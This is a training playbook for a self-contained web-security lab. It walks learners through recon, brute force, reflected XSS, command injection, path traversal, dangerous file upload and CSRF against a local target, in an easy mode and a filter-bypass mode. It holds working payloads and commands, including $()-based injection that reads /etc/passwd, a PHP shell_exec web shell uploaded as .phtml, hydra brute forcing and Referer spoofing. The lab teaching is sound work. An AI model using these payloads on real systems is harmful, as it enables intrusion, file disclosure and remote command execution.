# ATTENSE — Module Playbook

How to complete every lab module in **Guided Mode** and **Operator Mode**.

- **Guided Mode** — interact with the easy backend at `/target/...` through the
  Lab Browser iframe. Forms, clicks, basic payloads. `admin:password123` works.
- **Operator Mode** — interact with the *harder* backend at `/target-op/...`
  (iframe) or `/op/...` (AttackBox/ZAP). Same UI, defenses added. Bypasses
  required.

Both modes emit the same evidence event types, so progress is computed from
the same `tasks` (guided) / `tasks_operator` (operator) ladders in
`red-team/backend/lab_progress.py`. Every event is tagged with its channel.
**Operator mode only credits `via=attackbox`, `via=zap_repeater`, or
`via=zap_fuzzer`** — that's why the iframe is locked out behind a
"Use the Terminal or ZAP" overlay when you flip the toggle.

---

## Quick reference

| # | Module | Guided creds / payload | Operator creds / bypass |
|---|---|---|---|
| 1 | recon | Click around the portal | `gobuster /op` + `/op/.git/config` |
| 2 | brute_force | `admin:password123` | Seeded locally through `secrets/`; brute force with `/lab/operator-passwords.txt` |
| 3 | xss | `<script>alert(1)</script>` | `<img src=x onerror=alert(1)>` (script tag is stripped) |
| 4 | cmd_injection | `127.0.0.1; id` | `127.0.0.1$(head -1 /etc/passwd)` (`;` and `\|` filtered) |
| 5 | dir_traversal | `../../etc/passwd` | `/etc/passwd` (literal `..` rejected) |
| 6 | file_upload | `shell.php` | `shell.phtml` (`.php` blocked) |
| 7 | csrf | Click the lure button | curl with `Referer: http://target-agent/profile/` |

> **Operator-mode commands run inside the AttackBox container.** Type them in
> the Terminal panel under the Lab Browser, or click **▾ SHOW COMMAND** above
> the Terminal/ZAP panel for the active step and **COPY** the command. The
> AttackBox automatically tags every outbound HTTP request with the
> `AttenseAttackBox` User-Agent, so events count as `via=attackbox`.
> ZAP Repeater traffic is also tagged (the backend injects the UA into
> the sendRequest call).

---

## 1. recon — Map the attack surface

`scenario_id: PRE-ATTACK · severity: INFO`

### Goal
Enumerate the portal, find a hidden clue, trigger the recon-sequence
detection (4+ distinct application areas visited).

### Guided mode — Lab Browser

1. Open the dashboard, click **Recon → START LAB**. The iframe loads `/target/`.
2. Click each tile on the portal home page (Login, Search, Diagnostics,
   Documents, Upload, Profile). Each click fires an area event.
3. Visit `/target/robots.txt` — the obvious recon clue. Fires
   `hidden_clue_accessed`.
4. After 4 distinct areas, the synthetic event `recon_sequence_observed` fires.
5. Click **CHECK PROGRESS**. All 4 ladder rungs go ✓.

**Success criteria:** `portal_visited` + `recon_sequence_observed`.

### Operator mode — AttackBox terminal

The harder backend hides `/op/robots.txt` and `/op/.well-known/security.txt`
(both 404). The clue lives at `/op/.git/config` — you have to enumerate.

```bash
# 1. Probe the portal
curl -i http://target-agent/op/

# 2. Enumerate hidden routes (gobuster prints /op/.git/config in the results)
gobuster dir -u http://target-agent/op -w /usr/share/wordlists/dirb/common.txt -t 20 -q

# 3. Read the leaked git config
curl -s http://target-agent/op/.git/config

# 4. Touch 4 distinct areas to trigger recon_sequence_observed
curl -s -o /dev/null http://target-agent/op/search?q=test
curl -s -o /dev/null http://target-agent/op/system/ping?host=127.0.0.1
curl -s -o /dev/null http://target-agent/op/files/read?path=readme.txt
curl -s -o /dev/null http://target-agent/op/profile/
```

**Success criteria:** `recon_sequence_observed` with `via=attackbox`.

---

## 2. brute_force — Discover credentials

`scenario_id: APP-06 · severity: HIGH`

### Goal
Find a valid credential by submitting many guesses to the unprotected login.

### Guided mode

1. Open the **Brute Force Login** mission. Iframe loads `/target/auth/login`.
2. Type `admin` / `wrongpass` and submit 3+ times. Each failure fires
   `login_failed`. After 3 failures from the same source, the synthetic
   `brute_force_pattern` event fires.
3. Submit `admin` / `password123` — successful login fires `login_success`
   and `credential_found`.

**Success criteria:** `brute_force_pattern` + `credential_found`.

**Hint visible in guided:** the error message tells you whether the username
exists ("Incorrect password for admin" vs "Account not found"). That's
username enumeration — try it before brute-forcing the password.

### Operator mode — AttackBox terminal

Harder backend: credentials are seeded from local `secrets/` config, not public
source. It adds a 600 ms artificial delay per attempt and returns the same
"Invalid credentials" error for every failed login (no enumeration).

```bash
# 1. Probe the endpoint
curl -i http://target-agent/op/auth/login

# 2. Confirm error is generic (same for known and unknown users)
curl -s -X POST http://target-agent/op/auth/login -d 'username=admin&password=x'
curl -s -X POST http://target-agent/op/auth/login -d 'username=ghost&password=x'

# 3. Inspect the preloaded local username list
cat /wordlists/users.txt

# 4. Run hydra with the local-only password seed
hydra -L /wordlists/users.txt -P /lab/operator-passwords.txt target-agent http-post-form '/op/auth/login:username=^USER^&password=^PASS^:Invalid credentials' -t 4 -f

# 5. Confirm by hand using Hydra's reported login/password
curl -i -X POST http://target-agent/op/auth/login -d 'username=<HYDRA_USER>&password=<HYDRA_PASSWORD>'
```

**Success criteria:** `brute_force_pattern` + `credential_found` with
`via=attackbox`. Expect a 302 redirect to `/profile/` on success.

---

## 3. xss — Reflected cross-site scripting

`scenario_id: APP-01 · severity: HIGH`

### Goal
Get an XSS-shaped payload reflected verbatim into the page.

### Guided mode

1. Open the **XSS** mission. Iframe loads `/target/search`.
2. Type `<script>alert(1)</script>` into the search box and submit.
3. The payload reflects in the response unencoded — `xss_payload_observed`
   and `reflected_input_detected` both fire.
4. (Optional) Try `<img src=x onerror=alert(1)>` for a second payload.

**Success criteria:** `xss_payload_observed` + `reflected_input_detected`.

### Operator mode — AttackBox / ZAP Repeater

Harder backend strips `<script>...</script>` blocks (case-insensitive). Event
handlers, `<svg onload>`, `<img onerror>`, and `javascript:` URLs all still
reflect.

```bash
# 1. Baseline reflection
curl -s 'http://target-agent/op/search?q=hello' | grep -A1 'Search Results'

# 2. Send a script-tag payload (sanitizer strips it; you still get credit
#    for trying because the RAW input is recorded)
curl -s --data-urlencode 'q=<script>alert(1)</script>' -G \
  http://target-agent/op/search | grep -oE '<script[^<]*</script>' || echo "(stripped)"

# 3. The bypass: event-handler payload reflects unsanitized
curl -s -G --data-urlencode 'q=<img src=x onerror=alert(1)>' \
  http://target-agent/op/search | grep -oE '<img[^>]*>'

curl -s -G --data-urlencode 'q=<svg onload=alert(1)>' \
  http://target-agent/op/search | grep -oE '<svg[^>]*>'
```

### Same flow via the **ZAP Repeater** (UI panel)
1. In the ZAP panel switch to the **Repeater** tab.
2. Method = `GET`, Path = `/op/search?q=<img src=x onerror=alert(1)>`.
3. Click **SEND**. The response body shows the payload reflected. The
   request appears in **Proxy History** with method/url/status. Operator
   progress credits because the backend injects the AttenseAttackBox UA.

**Success criteria:** `xss_payload_observed` (≥2) + `reflected_input_detected`
with `via=attackbox`.

---

## 4. cmd_injection — OS command injection

`scenario_id: APP-02 · severity: CRITICAL`

### Goal
Get the `host` parameter on the diagnostics ping form to execute an injected
command.

### Guided mode

1. Open the **Command Injection** mission. Iframe loads `/target/system/ping`.
2. In the Host field type `127.0.0.1; id` and submit.
3. The output contains `uid=0(root)` — `command_separator_observed` and
   `command_injection_detected` both fire.
4. Try other separators: `127.0.0.1 && whoami`, `127.0.0.1 | hostname`,
   `127.0.0.1 \`id\``.

**Success criteria:** `command_injection_detected`.

### Operator mode — AttackBox terminal

Harder backend filters `;`, `|`, `&&`, `||` before reaching popen. Backticks
and `$()` are NOT filtered.

```bash
# 1. Baseline
curl -s 'http://target-agent/op/system/ping?host=127.0.0.1' | grep PING

# 2. Try the obvious separators (they are stripped — output has no uid=)
curl -s -G --data-urlencode 'host=127.0.0.1;id' \
  http://target-agent/op/system/ping | tail -3

# 3. The bypass — concat $(...) into the host. ping echoes the
#    "Name or service not known" error including the substituted output,
#    so you see /etc/passwd content in the response.
curl -s -G --data-urlencode 'host=127.0.0.1$(head -1 /etc/passwd)' \
  http://target-agent/op/system/ping | grep -oE 'root:[^ ]+'
# → root:x:0:0:root:/root:/bin/bash

# 4. Try uname for a shorter proof
curl -s -G --data-urlencode 'host=127.0.0.1$(uname -a)' \
  http://target-agent/op/system/ping | tail -3
```

> **Quoting trap:** use **single** quotes around `--data-urlencode 'host=...$(cmd)'`
> so bash on the AttackBox does NOT evaluate `$()` locally — it has to be
> sent literally so the *server's* popen evaluates it.

**Success criteria:** `command_injection_detected` with `via=attackbox`.

---

## 5. dir_traversal — Path traversal

`scenario_id: APP-03 · severity: HIGH`

### Goal
Read a file outside the intended document root via the file viewer.

### Guided mode

1. Open the **Directory Traversal** mission. Iframe loads `/target/files/read`.
2. Submit `path=../../etc/passwd`. The response shows
   `root:x:0:0:root:/root:/bin/bash`. Both `traversal_pattern_observed` and
   `sensitive_file_disclosed` fire.

**Success criteria:** `sensitive_file_disclosed`.

### Operator mode — AttackBox terminal

Harder backend rejects any path containing literal `..` (returns
`[ERROR] Path contains forbidden sequence '..'`). The bypass: pass an
absolute path — the route does no normalization on absolute paths.

```bash
# 1. Baseline
curl -s 'http://target-agent/op/files/read?path=readme.txt'

# 2. Naive traversal — rejected (you still get credit for traversal_pattern_observed
#    because the rejection is logged on the RAW input)
curl -s 'http://target-agent/op/files/read?path=../../etc/passwd'
# → [ERROR] Path contains forbidden sequence '..'

# 3. The bypass — absolute path
curl -s 'http://target-agent/op/files/read?path=/etc/passwd' | grep -E '^root:'
# → root:x:0:0:root:/root:/bin/bash

# 4. Disclose another file
curl -s 'http://target-agent/op/files/read?path=/etc/hostname'
```

**Success criteria:** `sensitive_file_disclosed` with `via=attackbox`.

---

## 6. file_upload — Unrestricted dangerous upload

`scenario_id: APP-04 · severity: HIGH`

### Goal
Upload a file with a server-side execution extension that the upload form
should reject but doesn't.

### Guided mode

1. Open the **File Upload** mission. Iframe loads `/target/files/upload`.
2. Pick any file with extension `.php`, `.jsp`, `.sh`, `.html`, etc. Submit.
3. The response shows the uploaded path. `dangerous_extension_accepted` and
   `unrestricted_upload_detected` both fire.

> **Note:** the lab stores the file but does NOT execute it — this is
> "unrestricted dangerous upload", not RCE.

**Success criteria:** `unrestricted_upload_detected`.

### Operator mode — AttackBox terminal

Harder backend has a block list: `.php`, `.phps`, `.exe`, `.sh`, `.py`, `.pl`,
`.cgi`, `.jsp`, `.jspx`, `.asp`, `.aspx`. The bypass: use `.phtml`, `.svg`,
`.html`, `.htm`, or `.js` — all sibling extensions a real defender would also
care about.

```bash
# 1. Probe
curl -s http://target-agent/op/files/upload | grep -i upload

# 2. Upload a benign file (baseline file_upload_used + file_saved)
echo hello > /tmp/probe.txt
curl -s -F 'file=@/tmp/probe.txt' http://target-agent/op/files/upload \
  | grep -oE '/static/uploads/[^"]+'

# 3. Upload another so file_saved >= 2 (operator ladder requires min_count=2)
echo world > /tmp/probe2.txt
curl -s -F 'file=@/tmp/probe2.txt' http://target-agent/op/files/upload

# 4. Try .php — blocked (HTTP 400)
echo '<?php echo shell_exec($_GET["c"]); ?>' > /tmp/shell.php
curl -s -o /dev/null -w 'HTTP %{http_code}\n' \
  -F 'file=@/tmp/shell.php' http://target-agent/op/files/upload
# → HTTP 400

# 5. The bypass — .phtml is not on the block list
echo '<?php echo shell_exec($_GET["c"]); ?>' > /tmp/shell.phtml
curl -s -F 'file=@/tmp/shell.phtml' http://target-agent/op/files/upload \
  | grep -oE '/static/uploads/[^"]+'
# → /static/uploads/shell.phtml
```

**Success criteria:** `unrestricted_upload_detected` with `via=attackbox`.

---

## 7. csrf — Cross-site request forgery

`scenario_id: APP-05 · severity: MEDIUM`

### Goal
Cause a state-changing POST to `/profile/update` to succeed without a CSRF
token.

### Guided mode

1. Open the **CSRF** mission. Iframe loads `/target/profile/`.
2. Note the update form has no `_csrf_token` field.
3. Click the link to `/target/evil/csrf-demo` — a simulated attacker page with
   a button. (Both pages are served by the same target-agent host so this is
   a same-origin in-lab demonstration; no public internet.)
4. Click **Claim my reward**. The lure submits a forged POST to
   `/profile/update`. Your account email silently changes to `hacked@evil.lab`.
5. `csrf_lure_visited`, `csrf_lure_submitted`, `profile_changed_without_csrf`
   all fire.

**Success criteria:** `profile_changed_without_csrf`.

### Operator mode — AttackBox + ZAP

Harder backend requires a valid `_csrf_token` form field **OR** a Referer
header ending in `/profile/` or `/evil/csrf-demo`. The check is loose — it
only does a substring match on the Referer, so spoofing it from curl works.

```bash
# 1. Login (need a session cookie before CSRF makes sense)
curl -c /tmp/cookies.txt -s -X POST -d 'username=<HYDRA_USER>&password=<HYDRA_PASSWORD>' -o /dev/null -w 'HTTP %{http_code}\n' http://target-agent/op/auth/login
# → HTTP 302

# 2. Inspect the profile form response; it does not include a CSRF token field
curl -b /tmp/cookies.txt -s http://target-agent/op/profile/

# 3. Try a naive forged POST (rejected — no Referer)
curl -b /tmp/cookies.txt -s -o /dev/null -w 'HTTP %{http_code}\n' -X POST http://target-agent/op/profile/update -d 'email=pwned@evil.lab'
# → HTTP 403

# 4. The bypass — spoof the Referer
curl -b /tmp/cookies.txt -s -o /dev/null -w 'HTTP %{http_code}\n' -X POST -H 'Referer: http://target-agent/profile/' http://target-agent/op/profile/update -d 'email=pwned@evil.lab'
# → HTTP 200

# 5. Inspect the profile response to confirm the change persisted
curl -b /tmp/cookies.txt -s http://target-agent/op/profile/
# → pwned@evil.lab
```

### Same bypass via the **ZAP Repeater**
1. In the ZAP panel switch to **Repeater**.
2. Method = `POST`, Path = `/op/profile/update`, Body = `email=pwned@evil.lab`.
3. Add header (the panel exposes a body field; for headers, use the AttackBox
   path or a Repeater hand-edit). The backend's `zap_repeater_send` injects
   the AttenseAttackBox UA automatically; you add `Referer:
   http://target-agent/profile/` via the headers field. **SEND.**
4. Response is `HTTP 200`, the request appears in Proxy History.

**Success criteria:** `csrf_token_missing` + `profile_changed_without_csrf`
with `via=attackbox`. The naive 403 attempt also counts toward
`csrf_token_missing`.

---

## How to drive any module — the universal recipe

### From the UI (recommended for learners)
1. **Dashboard → pick a module → START LAB.** The iframe loads.
2. **GUIDED MODE (default):** click around the iframe. Run **CHECK PROGRESS**
   after each interaction.
3. **Switch to OPERATOR MODE** (top toolbar). The iframe locks (overlay says
   "Use the Terminal or ZAP"); the URL flips to `/target-op/...`.
4. Below the iframe, the Operator panel appears. Two tools:
   - **TERMINAL** — live shell into the AttackBox container.
   - **ZAP** — Proxy History, Request Inspector, Repeater.
5. The active operator step is shown above the panel with **▾ SHOW COMMAND**
   and **COPY**. Copy, paste, run.
6. **CHECK PROGRESS** after each step. Right rail shows ladder ticking.

### From a script (regression / verification)
```bash
# Brings the stack up if it isn't already
docker compose up -d

# Runs all 7 modules end-to-end, asserts 100% operator progress
python scripts/verify_target_op.py

# Step-by-step progress for the easy backend ladder (per task)
python scripts/verify_operator_progress_per_step.py
```

### Reset between attempts
- **Soft reset:** click **EXIT** then re-enter the mission. The session keeps
  evidence; previous events still count.
- **Hard reset:** click **RESTART MISSION** in the right rail. Or from the
  command line:
  ```bash
  docker exec attense_red_team_backend curl -sS -X POST \
    http://target-agent/lab/events/reset
  ```

---

## Where the data goes

Every interaction — guided or operator — writes a structured event to
target-agent's in-memory store. The red-team-backend reads them via
`http://target-agent/lab/events?since=<ts>` and computes ladder progress.
Wazuh-bound JSON lines also land in `/app/logs/app.log` for the
signal-store / blueteam pipeline.

The `via` field on every event tells you which channel:
- `via=browser` — request came through the lab-browser nginx proxy
  (`X-Forwarded-Prefix: /target` or `/target-op`).
- `via=attackbox` — User-Agent contains `AttenseAttackBox` OR source IP
  is the AttackBox container.
- `via=zap_repeater` / `via=zap_fuzzer` — request was replayed by the
  local ZAP learning tools.
- `via=unknown` — anything else (rare; usually means a manual `curl` from
  the host machine bypassing both proxies).

Operator-mode progress only counts `via=attackbox`, `via=zap_repeater`, or
`via=zap_fuzzer`. The iframe is locked in operator mode to keep learners from
accidentally driving the harder backend with mouse clicks instead of tools.
